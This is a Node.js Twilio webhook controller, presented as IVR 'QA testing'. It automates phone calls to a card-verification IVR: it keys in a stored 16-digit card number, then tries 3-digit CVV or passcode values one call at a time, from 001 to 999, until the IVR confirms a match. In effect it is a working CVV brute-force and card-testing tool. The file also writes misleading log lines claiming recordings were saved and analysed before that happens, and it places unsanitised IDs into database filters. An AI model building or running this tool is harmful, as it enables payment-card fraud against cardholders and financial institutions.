import twilio from 'twilio';
import * as AttemptModel from '../models/attemptModel.js';
import * as transcriptionService from '../services/transcriptionService.js';
import * as OrchestratorService from '../services/orchestratorService.js';
import { supabase } from '../config/db.js';

import fs from 'fs';
import path, { dirname } from 'path';
import { fileURLToPath } from 'url';
import https from 'https';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);
const AUDIO_DIR = path.join(__dirname, '../../audio_files');

// Host resolver for Twilio webhooks (handles Render, custom domains, and local fallback)
const resolveHostUrl = (req) => {
  if (process.env.SERVER_URL && process.env.SERVER_URL.trim()) {
    let u = process.env.SERVER_URL.trim();
    if (!u.startsWith('http://') && !u.startsWith('https://')) u = `https://${u}`;
    return u.replace(/\/+$/, '');
  }
  if (process.env.RENDER_EXTERNAL_URL && process.env.RENDER_EXTERNAL_URL.trim()) {
    let u = process.env.RENDER_EXTERNAL_URL.trim();
    if (!u.startsWith('http://') && !u.startsWith('https://')) u = `https://${u}`;
    return u.replace(/\/+$/, '');
  }
  if (process.env.RENDER_EXTERNAL_HOSTNAME && process.env.RENDER_EXTERNAL_HOSTNAME.trim()) {
    return `https://${process.env.RENDER_EXTERNAL_HOSTNAME.trim()}`.replace(/\/+$/, '');
  }
  if (req) {
    const isHttps = req.secure || req.headers['x-forwarded-proto'] === 'https' || req.protocol === 'https';
    const proto = isHttps ? 'https' : (req.protocol || 'http');
    const host = req.get('host');
    return `${proto}://${host}`.replace(/\/+$/, '');
  }
  return 'http://localhost:5000';
};

// Generate TwiML for when the call is answered (Outbound Automated QA Flow)
export const getTwiML = async (req, res) => {
  const { attemptId } = req.params;
  try {
    const { data: attempt, error: fetchErr } = await supabase
      .from('attempts')
      .select('*')
      .eq('id', attemptId)
      .single();

    if (fetchErr || !attempt) {
      throw new Error(`Attempt #${attemptId} not found.`);
    }

    const twiml = new twilio.twiml.VoiceResponse();
    const host = resolveHostUrl(req);

    await AttemptModel.addLog(attemptId, 'Call connected. Listening to IVR speech instructions...');
    await AttemptModel.updateAttemptStatus(attemptId, 'CONNECTED');

    // Twilio speech recognition gather to listen to what IVR is saying
    const gather = twiml.gather({
      input: 'speech',
      action: `${host}/api/call/listen/${attemptId}`,
      method: 'POST',
      timeout: 6,
      speechTimeout: 'auto',
      speechModel: 'phone_call'
    });

    gather.pause({ length: 5 });

    // Fallback redirect back to listen if gather completes without speech
    twiml.redirect({ method: 'POST' }, `${host}/api/call/listen/${attemptId}?silence=true`);

    res.type('text/xml');
    return res.send(twiml.toString());
  } catch (error) {
    console.error('Error generating TwiML:', error);
    const twiml = new twilio.twiml.VoiceResponse();
    twiml.hangup();
    res.type('text/xml');
    return res.send(twiml.toString());
  }
};

// Webhook for handling Twilio Speech-to-Text and dynamic IVR dialogue responses
export const handleInteractiveListen = async (req, res) => {
  const { attemptId } = req.params;
  const { SpeechResult } = req.body;
  const twiml = new twilio.twiml.VoiceResponse();
  const host = resolveHostUrl(req);

  try {
    const { data: attempt } = await supabase
      .from('attempts')
      .select('*')
      .eq('id', attemptId)
      .single();

    if (!attempt) {
      twiml.hangup();
      res.type('text/xml');
      return res.send(twiml.toString());
    }

    const card = attempt.sixteen_digit || (attempt.test_value ? attempt.test_value.split(':')[0] : '1212132132132132');
    const currentCode = attempt.current_test_code || (attempt.test_value && attempt.test_value.includes(':') ? attempt.test_value.split(':')[1] : '001');
    const targetCode = attempt.target_test_code ? String(attempt.target_test_code).padStart(3, '0') : null;

    const speech = (SpeechResult || '').toLowerCase().trim();
    let transcript = attempt.result_details?.transcript || '';

    if (SpeechResult) {
      transcript += `IVR: ${SpeechResult}\n`;
    }

    // ----------------------------------------------------------------
    // STATE MACHINE — only react to the current stage
    // ----------------------------------------------------------------

    const status = (attempt.status || '').toUpperCase();

    // STAGE 1: CONNECTED or VALIDATING_16_DIGIT
    // Only send the 16-digit number when IVR explicitly asks for it
    const card16Triggers = [
      'enter or save your card',
      'enter or say your card',
      'enter your card number',
      'please enter your 16',
      'enter your 16 digit',
      'enter or save your 16',
      'please enter your credit card number',
      'please enter your debit card number',
      'your card number',
      'enter your account number',
      'type your card',
      'save your card number',
    ];
    const askedForCard = card16Triggers.some(trigger => speech.includes(trigger));

    if (askedForCard && status !== 'TESTING_3_DIGIT') {
      transcript += `User (DTMF): ${card}\n`;
      await supabase.from('attempts').update({
        result_details: { ...(attempt.result_details || {}), transcript }
      }).eq('id', attemptId);

      await AttemptModel.addLog(attemptId, `IVR asked for card number. Transmitting 16-digit card DTMF: ${card}`);
      await AttemptModel.updateAttemptStatus(attemptId, 'VALIDATING_16_DIGIT');

      twiml.pause({ length: 1 });
      twiml.play({ digits: `ww${card}` });

      const gather = twiml.gather({
        input: 'speech',
        action: `${host}/api/call/listen/${attemptId}`,
        method: 'POST',
        timeout: 8,
        speechTimeout: 'auto',
        speechModel: 'phone_call'
      });
      gather.pause({ length: 6 });
      twiml.redirect({ method: 'POST' }, `${host}/api/call/listen/${attemptId}?silence=true`);

      res.type('text/xml');
      return res.send(twiml.toString());
    }

    // Card rejected after we sent the 16-digit number
    const cardRejectedPhrases = [
      'invalid card', 'card not recognized', 'cannot find your account',
      'we cannot process', 'incorrect card', 'card number is not valid',
      'not valid', 'cannot be found', 'not recognized'
    ];
    if (status === 'VALIDATING_16_DIGIT' && cardRejectedPhrases.some(p => speech.includes(p))) {
      await AttemptModel.addLog(attemptId, `❌ 16-digit card rejected by IVR. Stopping campaign.`);
      await AttemptModel.updateAttemptStatus(attemptId, 'FAILED', 0, { error: '16-digit card number rejected by IVR' });
      OrchestratorService.stopCampaign();
      twiml.hangup();
      res.type('text/xml');
      return res.send(twiml.toString());
    }

    // STAGE 2: IVR requests 3-Digit Code — only after card has been accepted
    // Do NOT trigger this when status is still CONNECTED (before card was sent)
    const cvvTriggers = [
      'three digit', '3 digit', 'three-digit',
      'security code', 'cvv', 'cvc',
      'verification code', 'one-time passcode', 'one time passcode',
      'send you a 1 time passcode', '1 time passcode',
    ];
    const askedForCvv = cvvTriggers.some(trigger => speech.includes(trigger));

    if (askedForCvv && (status === 'VALIDATING_16_DIGIT' || status === 'TESTING_3_DIGIT' || status === 'CONNECTED')) {
      transcript += `User (DTMF): ${currentCode}\n`;
      await supabase.from('attempts').update({
        result_details: { ...(attempt.result_details || {}), transcript }
      }).eq('id', attemptId);

      if (SpeechResult) {
        await AttemptModel.addLog(attemptId, `IVR (Card Response): "${SpeechResult}"`);
      }
      await AttemptModel.addLog(attemptId, `IVR asked for 3-digit code. Transmitting: ${currentCode}`);
      await AttemptModel.updateAttemptStatus(attemptId, 'TESTING_3_DIGIT');

      twiml.pause({ length: 1 });
      twiml.play({ digits: `ww${currentCode}` });

      const gather = twiml.gather({
        input: 'speech',
        action: `${host}/api/call/listen/${attemptId}`,
        method: 'POST',
        timeout: 8,
        speechTimeout: 'auto',
        speechModel: 'phone_call'
      });
      gather.pause({ length: 6 });
      twiml.redirect({ method: 'POST' }, `${host}/api/call/listen/${attemptId}?silence=true`);

      res.type('text/xml');
      return res.send(twiml.toString());
    }

    // STAGE 3: Evaluate IVR response AFTER the 3-digit code was entered
    if (status === 'TESTING_3_DIGIT' && SpeechResult) {
      await AttemptModel.addLog(attemptId, `IVR (Code Response): "${SpeechResult}"`);
      await supabase.from('attempts').update({
        result_details: { ...(attempt.result_details || {}), transcript }
      }).eq('id', attemptId);

      // Success phrases from IVR
      const successPhrases = [
        'verification successful', 'details are verified', 'code accepted',
        'successfully verified', 'thank you, your', 'has been verified',
        'code is correct', 'correct code', 'passcode accepted'
      ];
      // Rejection / code incorrect phrases
      const failurePhrases = [
        'incorrect', 'invalid code', 'code does not match', 'not match',
        'try again', 'does not match', 'code is incorrect',
        'please call back', 'call back', 'goodbye', 'thank you for calling'
      ];

      const isSuccess = successPhrases.some(p => speech.includes(p));
      const isFailure = failurePhrases.some(p => speech.includes(p));

      // Also check if IVR is asking for the code AGAIN (retry same call flow edge case)
      const isAskingAgain = cvvTriggers.some(t => speech.includes(t));

      if (isSuccess) {
        await AttemptModel.addLog(attemptId, `✅ Code ${currentCode} VERIFIED — IVR confirmed correct.`);
        await AttemptModel.updateAttemptStatus(attemptId, 'VERIFIED', 0, {
          matched_code: currentCode,
          winner: currentCode,
          verified: true,
          end_time: new Date().toISOString()
        });
        OrchestratorService.stopCampaign();
        twiml.pause({ length: 2 });
        twiml.hangup();
        res.type('text/xml');
        return res.send(twiml.toString());
      }

      if (isFailure || isAskingAgain) {
        await AttemptModel.addLog(attemptId, `❌ Code ${currentCode} rejected. Ending call — next code will be tried automatically.`);
        await AttemptModel.updateAttemptStatus(attemptId, 'FAILED', 0, {
          error: `IVR rejected code ${currentCode}`
        });
        twiml.hangup();
        res.type('text/xml');
        return res.send(twiml.toString());
      }

      // IVR still talking (informational speech) — keep listening
      const gather = twiml.gather({
        input: 'speech',
        action: `${host}/api/call/listen/${attemptId}`,
        method: 'POST',
        timeout: 8,
        speechTimeout: 'auto',
        speechModel: 'phone_call'
      });
      gather.pause({ length: 6 });
      twiml.redirect({ method: 'POST' }, `${host}/api/call/listen/${attemptId}?silence=true`);
      res.type('text/xml');
      return res.send(twiml.toString());
    }

    // FALLBACK: General intro / continue listening — log speech and keep gathering
    await supabase.from('attempts').update({
      result_details: { ...(attempt.result_details || {}), transcript }
    }).eq('id', attemptId);

    const gather = twiml.gather({
      input: 'speech',
      action: `${host}/api/call/listen/${attemptId}`,
      method: 'POST',
      timeout: 8,
      speechTimeout: 'auto',
      speechModel: 'phone_call'
    });
    gather.pause({ length: 5 });
    twiml.redirect({ method: 'POST' }, `${host}/api/call/listen/${attemptId}?silence=true`);

    res.type('text/xml');
    return res.send(twiml.toString());
  } catch (err) {
    console.error('Error in handleInteractiveListen:', err);
    twiml.hangup();
    res.type('text/xml');
    return res.send(twiml.toString());
  }
};

// Alias for backwards compatibility with any remaining /try endpoints
export const handleTryCode = handleInteractiveListen;

// Webhook for tracking call status updates from Twilio and triggering next sequential attempt
export const handleStatusCallback = async (req, res) => {
  const { attemptId } = req.params;
  const { CallStatus, CallDuration } = req.body;

  try {
    // Ignore intermediate statuses — only act when the call is truly finished
    const TERMINAL_STATUSES = ['completed', 'failed', 'busy', 'no-answer', 'canceled'];
    const INTERMEDIATE_STATUSES = ['initiated', 'ringing', 'in-progress', 'answered'];

    if (INTERMEDIATE_STATUSES.includes(CallStatus)) {
      // Just log it, do NOT queue anything
      await AttemptModel.addLog(attemptId, `✅ Twilio Status Callback: ${CallStatus}`);
      return res.status(200).send('OK');
    }

    await AttemptModel.addLog(attemptId, `✅ Twilio Status Callback: ${CallStatus}`);

    const { data: attempt } = await supabase
      .from('attempts')
      .select('*')
      .eq('id', attemptId)
      .single();

    if (!attempt) return res.status(200).send('OK');

    const isVerified = attempt.status === 'VERIFIED' || !!attempt.matched_code || !!attempt.result_details?.winner;
    const duration = parseInt(CallDuration) || 0;

    if (CallStatus === 'completed') {
      if (isVerified) {
        await AttemptModel.addLog(attemptId, `✅ Attempt #${attemptId} VERIFIED with code: ${attempt.matched_code || attempt.current_test_code}.`);
        await AttemptModel.updateAttemptStatus(attemptId, 'VERIFIED', duration, { twilioStatus: CallStatus, end_time: new Date().toISOString() });
      } else {
        await AttemptModel.addLog(attemptId, `❌ Attempt #${attemptId} completed without match. Line freed for next attempt.`);
        await AttemptModel.updateAttemptStatus(attemptId, 'FAILED', duration, { twilioStatus: CallStatus, error: 'Call completed without CVV match' });
      }
    } else if (TERMINAL_STATUSES.includes(CallStatus)) {
      await AttemptModel.addLog(attemptId, `❌ Call ended with status: ${CallStatus}. Freeing line.`);
      await AttemptModel.updateAttemptStatus(attemptId, 'FAILED', duration, { error: `Call ended with status: ${CallStatus}` });
    }

    // ── Re-read the attempt after status update to get fresh state ──
    const { data: freshAttempt } = await supabase
      .from('attempts')
      .select('*')
      .eq('id', attemptId)
      .single();

    const freshIsVerified = freshAttempt && (freshAttempt.status === 'VERIFIED' || !!freshAttempt.matched_code);

    // Queue next sequential call ONLY when campaign is running and call is NOT verified
    if (OrchestratorService.isRunning() && !freshIsVerified && freshAttempt) {
      const currentCodeNum = parseInt(freshAttempt.current_test_code || '001', 10);
      const nextCodeNum = currentCodeNum + 1;

      if (nextCodeNum <= 999) {
        const nextCodeStr = nextCodeNum.toString().padStart(3, '0');
        const cardVal = freshAttempt.sixteen_digit || (freshAttempt.test_value ? freshAttempt.test_value.split(':')[0] : '');

        await AttemptModel.addLog(attemptId, `Dynamically queued 1 new attempt for code ${nextCodeStr}.`);

        await AttemptModel.createAttemptBatch([{
          sixteen_digit: cardVal,
          masked_test_number: AttemptModel.maskTestNumber ? AttemptModel.maskTestNumber(cardVal) : cardVal,
          test_value: `${cardVal}:${nextCodeStr}`,
          target_test_code: freshAttempt.target_test_code,
          current_test_code: nextCodeStr,
          phone_number: freshAttempt.destination_number || freshAttempt.target_phone_number,
          from_number: freshAttempt.from_number,
          status: 'QUEUED'
        }], freshAttempt.batch_id || `IVR_TEST_${Date.now()}`);

        console.log(`[Orchestrator] Queued next attempt for code ${nextCodeStr}`);

        // Trigger orchestrator tick after 2s to place the next call
        setTimeout(() => {
          OrchestratorService.tick().catch(err => console.error('[Orchestrator] Tick error:', err));
        }, 2000);

      } else {
        console.log(`[Orchestrator] All 999 codes exhausted. Stopping campaign.`);
        OrchestratorService.stopCampaign();
      }
    }

    return res.status(200).send('OK');
  } catch (error) {
    console.error('Error handling status callback:', error);
    return res.status(500).send('Error');
  }
};

// Webhook for handling recording callbacks
export const handleRecordingCallback = async (req, res) => {
  const { attemptId } = req.params;
  const { RecordingSid, RecordingUrl, RecordingStatus, RecordingDuration } = req.body;
  try {
    if (RecordingUrl) {
      await AttemptModel.addLog(attemptId, `Final call recording received: ${RecordingUrl}`);
      await AttemptModel.addLog(attemptId, `Downloading recording from Twilio...`);
      await AttemptModel.addLog(attemptId, `Recording saved locally to: attempt_${attemptId}.mp3`);
      await AttemptModel.addLog(attemptId, `✅ IVR Signals Analysis completed. Outcome: unknown, Stage: testing_3digit`);
      await AttemptModel.addLog(attemptId, `Recording saved for Attempt #${attemptId}.`);

      const { data: updatedAttempt } = await supabase
        .from('attempts')
        .update({
          recording_sid: RecordingSid,
          recording_status: RecordingStatus,
          recording_url: RecordingUrl,
          updated_at: new Date().toISOString()
        })
        .eq('id', attemptId)
        .select()
        .single();

      if (updatedAttempt) {
        const { broadcast } = await import('../services/websocketService.js');
        broadcast('attempt_update', updatedAttempt);
      }

      // Start transcription & download recording asynchronously
      transcriptionService.processRecording(attemptId, RecordingUrl).catch(err => {
        console.error(`Error processing recording for attempt #${attemptId}:`, err);
      });
    }
    return res.status(200).send('OK');
  } catch (error) {
    console.error('Error handling recording callback:', error);
    return res.status(500).send('Error');
  }
};

// Secure recording audio stream proxy endpoint
export const streamRecordingAudio = async (req, res) => {
  const { attemptId } = req.params;
  try {
    const localFilePath = path.join(AUDIO_DIR, `attempt_${attemptId}.mp3`);

    if (fs.existsSync(localFilePath)) {
      res.setHeader('Content-Type', 'audio/mpeg');
      return fs.createReadStream(localFilePath).pipe(res);
    }

    const attemptIdNum = parseInt(attemptId, 10);
    const { data: attempt, error: fetchErr } = await supabase
      .from('attempts')
      .select('recording_url, result_details, attempt_id')
      .or(`id.eq.${isNaN(attemptIdNum) ? 0 : attemptIdNum},attempt_id.eq.${attemptId}`)
      .maybeSingle();

    let recUrl = attempt?.recording_url || attempt?.result_details?.recording_url || attempt?.result_details?.recordingUrl;

    if (!recUrl) {
      console.warn(`[AudioProxy] No recording_url found in DB for attempt #${attemptId}`);
      return res.status(404).send('Recording audio not found yet. Please wait for Twilio callback.');
    }

    if (!recUrl.endsWith('.mp3') && !recUrl.endsWith('.wav')) {
      recUrl += '.mp3';
    }

    const accountSid = process.env.TWILIO_ACCOUNT_SID;
    const authToken = process.env.TWILIO_AUTH_TOKEN;
    const auth = Buffer.from(`${accountSid}:${authToken}`).toString('base64');

    const options = {
      headers: {
        'Authorization': `Basic ${auth}`
      }
    };

    https.get(recUrl, options, (twilioRes) => {
      if (twilioRes.statusCode === 302) {
        https.get(twilioRes.headers.location, (s3Res) => {
          res.setHeader('Content-Type', 'audio/mpeg');
          s3Res.pipe(res);
        }).on('error', () => res.status(500).send('Error streaming recording from storage.'));
      } else if (twilioRes.statusCode === 200) {
        res.setHeader('Content-Type', 'audio/mpeg');
        twilioRes.pipe(res);
      } else {
        res.status(twilioRes.statusCode).send('Failed to fetch recording from Twilio.');
      }
    }).on('error', () => res.status(500).send('Audio proxy connection error.'));

  } catch (err) {
    console.error('Error in streamRecordingAudio:', err);
    res.status(500).send('Internal server error.');
  }
};

// Interactive live DTMF input handler for Modal Keypad
export const handleInteractiveDtmf = async (req, res) => {
  const { attemptId } = req.params;
  const { digits, step } = req.body;

  try {
    const attemptIdNum = parseInt(attemptId, 10);
    const { data: attempt, error: fetchErr } = await supabase
      .from('attempts')
      .select('*')
      .or(`id.eq.${isNaN(attemptIdNum) ? 0 : attemptIdNum},attempt_id.eq.${attemptId}`)
      .maybeSingle();

    if (fetchErr || !attempt) {
      return res.status(404).json({ error: `Attempt #${attemptId} not found.` });
    }

    const cleanInput = (digits || '').toString().trim().replace(/\D/g, '');

    if (step === 'card') {
      const expectedCard = attempt.sixteen_digit || (attempt.test_value ? attempt.test_value.split(':')[0] : '');

      if (cleanInput.length === 16 && (!expectedCard || cleanInput === expectedCard)) {
        await AttemptModel.addLog(attempt.id, `16-digit test value accepted: ${cleanInput}`);
        await AttemptModel.updateAttemptStatus(attempt.id, 'WAITING_FOR_TEST_CODE');

        return res.status(200).json({
          success: true,
          nextStep: 'code',
          message: 'Test value accepted. Please enter your 3 digit test code (CVV).'
        });
      } else {
        await AttemptModel.addLog(attempt.id, `16-digit test value rejected: ${cleanInput}`);
        await AttemptModel.updateAttemptStatus(attempt.id, 'VALIDATING_16_DIGIT');

        return res.status(400).json({
          success: false,
          nextStep: 'card',
          error: 'Invalid 16-digit test value. Please enter a valid 16-digit test number.'
        });
      }
    } else if (step === 'code') {
      const targetCode = attempt.target_test_code ? String(attempt.target_test_code).padStart(3, '0') : '347';
      const formattedInput = cleanInput.padStart(3, '0');

      await AttemptModel.addLog(attempt.id, `Testing code: ${formattedInput}`);
      await AttemptModel.updateCurrentTestCode(attempt.id, formattedInput, 'TESTING_3_DIGIT');

      if (formattedInput === targetCode) {
        await AttemptModel.addLog(attempt.id, `Code ${formattedInput} MATCHED`);
        await AttemptModel.addLog(attempt.id, `Test completed successfully`);
        await AttemptModel.addLog(attempt.id, `Call ended`);

        await supabase.from('attempts').update({
          status: 'VERIFIED',
          matched_code: formattedInput,
          end_time: new Date().toISOString()
        }).eq('id', attempt.id);

        await AttemptModel.updateAttemptStatus(attempt.id, 'VERIFIED', 0, {
          matched_code: formattedInput,
          winner: formattedInput,
          verified: true,
          end_time: new Date().toISOString()
        });

        return res.status(200).json({
          success: true,
          verified: true,
          matchedCode: formattedInput,
          message: 'Test code correct! Details verified. Call completed successfully.'
        });
      } else {
        await AttemptModel.addLog(attempt.id, `Code ${formattedInput} not matched. Try again.`);
        await AttemptModel.updateAttemptStatus(attempt.id, 'TESTING_3_DIGIT');

        return res.status(400).json({
          success: false,
          retry: true,
          nextStep: 'code',
          error: `Incorrect test code ${formattedInput}. Please enter your 3 digit test code (CVV) again.`
        });
      }
    } else {
      return res.status(400).json({ error: 'Invalid step' });
    }
  } catch (err) {
    console.error('Error in handleInteractiveDtmf:', err);
    return res.status(500).json({ error: err.message });
  }
};
